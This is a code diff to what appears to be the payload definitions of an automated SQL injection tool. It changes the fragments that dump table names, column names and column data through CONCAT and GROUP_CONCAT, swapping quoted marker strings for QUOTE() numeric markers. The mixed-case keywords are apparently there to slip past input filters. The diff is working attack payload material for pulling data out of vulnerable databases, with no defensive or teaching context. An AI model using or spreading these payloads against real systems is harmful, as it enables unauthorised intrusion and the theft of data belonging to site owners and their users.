@@ -47,7 +47,7 @@ define_user_detection_query_php = [
 ]
 
 define_get_tables_name_query_php = [
-    " CoNcaT(\'GETTABLES=>\', grOuP_conCat(TABLE_NAME), \'<=GETTABLES\')"
+    " CoNcaT(QUOTE(2134115356), grOuP_conCat(TABLE_NAME), QUOTE(62134115356))"
 ]
 
 define_end_string_group_concat_query_php = [
@@ -55,7 +55,7 @@ define_end_string_group_concat_query_php = [
 ]
 
 define_get_columns_of_table_query_php = [
-    " CoNcaT(\'GETCOLUMNS=>\', grOuP_conCat(ColumN_NAME), \'<=GETCOLUMNS\')"
+    " CoNcaT(QUOTE(2134115356), grOuP_conCat(ColumN_NAME), QUOTE(62134115356))"
 ]
 
 define_end_string_columns_of_table_query_php = [
@@ -63,11 +63,11 @@ define_end_string_columns_of_table_query_php = [
 ]
 
 define_get_data_of_column_query_php = [
-    " CoNcaT(\'GETCOLUMNSDATA=>\', grOuP_conCat(xcolumn), \'<=GETCOLUMNSDATA\')"
+    " CoNcaT(QUOTE(2134115356), grOuP_conCat(xcolumn), QUOTE(62134115356))"
 ]
 
 define_convert_query_php = [
-    " CoNcaT(\'GETTABLES=>\', conVeRt(TABLE_NAME+uSing+lAtin1), \'<=GETTABLES\')"
+    " CoNcaT(QUOTE(2134115356), conVeRt(TABLE_NAME+uSing+lAtin1), QUOTE(62134115356))"
 ]
 
 define_end_convert_query_php = [
@@ -75,7 +75,7 @@ define_end_convert_query_php = [
 ]
 
 define_get_columns_of_table_convert_query_php = [
-    " CoNcaT(\'GETCOLUMNS=>\', cOnVert(ColumN_NAME+uSing+lAtin1), \'<=GETCOLUMNS\')"
+    " CoNcaT(QUOTE(2134115356), cOnVert(ColumN_NAME+uSing+lAtin1), QUOTE(62134115356))"
 ]
 
 define_end_columns_of_table_convert_query_php = [
